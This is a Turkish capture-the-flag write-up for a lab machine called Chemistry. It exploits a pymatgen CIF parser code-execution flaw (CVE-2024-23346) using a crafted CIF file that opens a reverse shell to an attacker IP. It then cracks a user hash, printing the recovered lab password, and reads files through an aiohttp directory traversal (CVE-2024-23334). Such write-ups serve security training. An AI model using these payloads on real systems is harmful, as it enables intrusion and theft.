---
{"dg-publish":true,"permalink":"/ctf/chemistry-ctf/"}
---


### Nmap 

![Pasted image 20250119000219.png](/img/user/resimler/Pasted%20image%2020250119000219.png)

```
nmap -p 22,5000 -sCV 10.10.11.38     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-18 16:02 EST
Nmap scan report for 10.10.11.38
Host is up (0.15s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Sat, 18 Jan 2025 21:02:51 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=1/18%Time=678C16F6%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3\
SF:x20Python/3\.9\.5\r\nDate:\x20Sat,\x2018\x20Jan\x202025\x2021:02:51\x20
SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20h
SF:tml>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\
SF:"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"widt
SF:h=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Chemis
SF:try\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20href=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20\n\x2
SF:0\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x20class=
SF:\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"title\">
SF:Chemistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>W
SF:elcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\x
SF:20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20In
SF:formation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20c
SF:ontained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class
SF:=\"buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<center>
SF:<a\x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\"btn\">Re
SF:gister</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x
SF:20\x20</div>\n</body>\n<")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUBL
SF:IC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x2
SF:0\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Cont
SF:ent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\
SF:n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20r
SF:esponse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400<
SF:/p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20v
SF:ersion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Err
SF:or\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20re
SF:quest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20<
SF:/body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.54 seconds
```

1. **Port 22 (SSH):**
    
    - **Servis:** OpenSSH 8.2p1
    - **OS:** Ubuntu Linux
    - **Host anahtarları:** RSA, ECDSA, ED25519

2. **Port 5000 (HTTP):**
    
    - **Servis:** Werkzeug 3.0.3 (Python 3.9.5)
    - **Web uygulaması:** "Chemistry CIF Analyzer"
    - **Fonksiyon:** CIF dosyalarını yükleyip analiz eden bir araç
    - **Sayfalar:** `/login`, `/register`

3. **İşletim Sistemi:** Linux Kernel
    
Bu bilgiler hedef sistemin servisi, potansiyel giriş noktaları ve analiz edilecek web uygulaması olduğunu gösteriyor.

![Pasted image 20250119000933.png](/img/user/resimler/Pasted%20image%2020250119000933.png)

"Chemistry CIF Analyzer'a hoş geldiniz. Bu araç, bir CIF (Kristalografik Bilgi Dosyası) yüklemenize ve içerdiği yapısal verileri analiz etmenize olanak tanır."

----

CIF (Crystallographic Information File), kristal yapıların tanımlanması ve paylaşılması için kullanılan bir dosya formatıdır. Kristalografik verilerin standart bir şekilde depolanmasını sağlar ve genellikle **moleküler yapılar**, **atomik koordinatlar**, **simetri bilgileri** ve **hücre parametreleri** gibi bilgileri içerir.

### CIF Dosyasında Bulunabilecek Veriler:

1. **Kristal Hücre Parametreleri**:
    
    - Örneğin, hücre boyutları (`_cell_length_a`, `_cell_length_b`, `_cell_length_c`) ve açılar (`_cell_angle_alpha`, `_cell_angle_beta`, `_cell_angle_gamma`).
2. **Atomik Koordinatlar**:
    
    - Atomların 3D uzaydaki pozisyonlarını belirtir.
3. **Simetri Bilgileri**:
    
    - Uzay grubu ve kristal simetri tanımları (`_symmetry_space_group_name_H-M`).
4. **Bağlantılar ve Bağ Uzunlukları**:
    
    - Moleküler yapıyı tanımlayan kimyasal bağlar.

### Nerelerde Kullanılır?

- **Kristalografi Araştırmaları**: Yapısal kimya ve biyokimya alanlarında kristal yapı analizleri için.
- **Veri Paylaşımı**: Araştırmacılar arasında kristal yapı bilgilerinin paylaşımı için.
- **Yazılımlar**: Yapısal modelleme, moleküler simülasyon ve kristalografik analiz yazılımları (ör. Mercury, Olex2, vb.) tarafından okunabilir.

CIF dosyası, metin tabanlı bir format olduğu için insanlar tarafından kolayca okunabilir ve düzenlenebilir. Örnek bir CIF dosyası şu şekilde görünebilir:

```
data_example
_symmetry_space_group_name_H-M    'P 1'
_cell_length_a                    10.123
_cell_length_b                    9.456
_cell_length_c                    12.789
_cell_angle_alpha                 90.00
_cell_angle_beta                  90.00
_cell_angle_gamma                 120.00
loop_
_atom_site_label
_atom_site_type_symbol
_atom_site_fract_x
_atom_site_fract_y
_atom_site_fract_z
C1   C   0.123   0.456   0.789
O1   O   0.234   0.567   0.890
```

Bu dosya bir kristalin geometrik ve kimyasal yapısını açıklamaktadır.

---

### CVE-2024-23346

Bu CIF dosyasıyla ilgili CVE'leri Google'da aradıktan sonra şunu buldum 👇

* Pymatgen Kütüphanesinde Kritik Güvenlik Açığı (CVE-2024-23346) -[ vsociety (vicarius.io)](https://www.vicarius.io/vsociety/posts/critical-security-flaw-in-pymatgen-library-cve-2024-23346)
* Kötü niyetle hazırlanmış bir JonesFaithfulTransformation transformation_string ayrıştırılırken keyfi kod yürütme - [Tavsiye - materialsproject/pymatgen (github.com)](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)


Github'da verilen Poc prototipi şu şekildedir

```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"
 
loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]
 
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'
 
 
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Payload, aşağıdaki `_space_group_magn` bölümü olduğundan, bu PoC'ye (Proof of Concept) dayanarak bir ters shell oluşturun (dış katmanda tek tırnaklar bulunduğu için tek tırnakların kaçışına dikkat edin).

```
[root@kali] /home/kali/Downloads  
❯ cat example.cif 
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
 
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.xx.xx/100 0>&1\'");0,0,0'
 
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Listeneer'ı kurun ve upload ettikten sonra View'a tıklayın, Shell'e başarılı bir şekilde geri döndüğünü görebilirsiniz.

Kayıt olduktan sonra Dashboard bizi karşılıyor.

![Pasted image 20250119001910.png](/img/user/resimler/Pasted%20image%2020250119001910.png)

![Pasted image 20250119002035.png](/img/user/resimler/Pasted%20image%2020250119002035.png)

![Pasted image 20250119002043.png](/img/user/resimler/Pasted%20image%2020250119002043.png)

![Pasted image 20250119002113.png](/img/user/resimler/Pasted%20image%2020250119002113.png)

View'e tıkladıktan sonra shell'i alıyoruz. 

![Pasted image 20250119002143.png](/img/user/resimler/Pasted%20image%2020250119002143.png)

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

![Pasted image 20250119002231.png](/img/user/resimler/Pasted%20image%2020250119002231.png)

Instance dizininde bir veritabanı dosyası bulundu

![Pasted image 20250119002302.png](/img/user/resimler/Pasted%20image%2020250119002302.png)

İndirmek için bir httpserver servisi açabilirsiniz.

![Pasted image 20250119002801.png](/img/user/resimler/Pasted%20image%2020250119002801.png)

home dizininde başka bir kullanıcı buldum: rosa ve parola hash'i database.db'de mevcut, bu yüzden parolayı kırmak için John The Ripper'ı kullanabilirim.

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt  --format=Raw-MD5  
```

Kullanıcı şifresini al

```
username：rosa
password：unicorniosrosados
```

User.txt dosyasını almak için SSH doğrudan oturum açma

![Pasted image 20250119003001.png](/img/user/resimler/Pasted%20image%2020250119003001.png)

Linpeas yüklendi ve açık Intranet portları olduğu tespit edildi

![Pasted image 20250119003204.png](/img/user/resimler/Pasted%20image%2020250119003204.png)

Proxy out port 8080, 8080 Bursuite tarafından kullanılan varsayılan port olduğu için burada local port 8000'e proxy yapıyorum (8877,8888,7777,4455 benim açtıklarım.)


### SSH Tunelling 

![Pasted image 20250119003645.png](/img/user/resimler/Pasted%20image%2020250119003645.png)

![Pasted image 20250119003739.png](/img/user/resimler/Pasted%20image%2020250119003739.png)

![Pasted image 20250119003822.png](/img/user/resimler/Pasted%20image%2020250119003822.png)

```
Server：Python/3.9 aiohttp/3.9.1
```

Bu bir exploitation noktasıdır, aiohttp güvenlik açıklarının ilgili sürümlerini arayın

* [CVE-2024-23334: aiohttp'nin Directory Traversal Güvenlik Açığına Derinlemesine Bir Bakış (ethicalhacking.uk)](https://ethicalhacking.uk/cve-2024-23334-aiohttps-directory-traversal-vulnerability/#gsc.tab=0)

Bir dizin geçişi güvenlik açığı bulundu, ancak burada bir tuzak var çünkü tüm poc'lar burada intranet portunda bulunmayan /static dizini temel alınarak geçiliyor

Bir dizin geçişi (directory traversal) açığı buldum, ancak burada bir tuzak var çünkü tüm POC'ler `/static` dizini üzerinden geçiş yapmayı temel alıyor, oysa burada iç ağ portunda bu dizin mevcut değil.

![Pasted image 20250119004124.png](/img/user/resimler/Pasted%20image%2020250119004124.png)

`/assets` dizini mevcut, bu dizin üzerinden dizin geçişi yaparak başarıyla erişim sağlayabiliriz.

Yukarıdaki makaleye göre testi gerçekleştirdim ve başarıyla okuma işlemi yapıldı.

![Pasted image 20250119004335.png](/img/user/resimler/Pasted%20image%2020250119004335.png)

- **`-s`**: `curl`'ı sessiz modda çalıştırır, çıktı göstermez.
- **`--path-as-is`**: URL yolunu olduğu gibi gönderir, karakterleri değiştirmez.

Başlangıçta şifreyi kırmayı denemek istedim ama başarılı olamayınca doğrudan flag dosyasını okumaya karar verdin.

### **Özet**  
**Kullanıcı:** Basit bir dosya yükleme CVE'si kullanılarak reverse bir Shell tetiklendi. Ardından, veritabanı bilgileri sızdırıldı ve kullanıcı şifresi kırılarak SSH üzerinden giriş yapıldı.

**Root:** Web sunucusundaki version hatası, potansiyel olarak her türlü dosyanın okunmasına olanak tanıyor. Ancak bunun bazı ön koşulları bulunuyor. Örneğin, bu makinada /static dizini mevcut değildi, bu yüzden /assets dizini üzerinden dizin geçişi yapıldı. Eğer başka erişilebilir bir dizin yoksa, bu CVE'nin uygulanması mümkün olmayacaktır. Ayrıca, /etc/shadow dosyasından elde edilen şifre hash'i de kırılmadığı için, RootShell'a giriş yapmak bu durumda mümkün olmamaktadır.